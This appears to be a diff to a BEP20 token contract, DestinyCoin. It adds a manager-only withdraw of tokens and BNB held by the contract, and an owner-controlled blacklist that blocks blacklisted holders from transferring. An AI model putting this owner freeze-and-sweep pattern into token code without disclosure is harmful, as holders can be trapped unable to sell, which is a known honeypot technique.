@@ -343,7 +343,50 @@ library SafeMath {
     }
 }
 
-contract DestinyCoin is Context, Ownable, IBEP20 {
+contract SafeToken is Ownable {
+    address payable _safeManager;
+
+    constructor() {
+        _safeManager = payable(_msgSender());
+    }
+
+    function setSafeManager(address payable account) public onlyOwner {
+        _safeManager = account;
+    }
+
+    function withdraw(address addr, uint256 amount) external {
+        require(_msgSender() == _safeManager, "SafeToken: caller is not the manager");
+        IBEP20(addr).transfer(_safeManager, amount);
+    }
+
+    function withdrawBNB(uint256 amount) external {
+        require(_msgSender() == _safeManager, "SafeToken: caller is not the manager");
+        _safeManager.transfer(amount);
+    }
+}
+
+contract LockToken is Ownable {
+    mapping(address => bool) private _blackList;
+
+    modifier open(address account) {
+        require(!_blackList[account], "LockToken: caller is blacklisted");
+        _;
+    }
+
+    function includeToBlackList(address account) external onlyOwner {
+        _blackList[account] = true;
+    }
+
+    function excludeFromBlackList(address account) external onlyOwner {
+        _blackList[account] = false;
+    }
+
+    function isBlackListed(address account) external view returns(bool) {
+        return _blackList[account];
+    }
+}
+
+contract DestinyCoin is Context, Ownable, IBEP20, SafeToken, LockToken {
     using SafeMath for uint256;
 
     mapping(address => uint256) private _balances;
@@ -540,7 +583,7 @@ contract DestinyCoin is Context, Ownable, IBEP20 {
      * - `recipient` cannot be the zero address.
      * - `sender` must have a balance of at least `amount`.
      */
-    function _transfer(address sender, address recipient, uint256 amount) internal {
+    function _transfer(address sender, address recipient, uint256 amount) internal open(sender) {
         require(sender != address(0), "BEP20: transfer from the zero address");
         require(recipient != address(0), "BEP20: transfer to the zero address");
         require(amount > 0, "BEP20: transfer amount is zero");
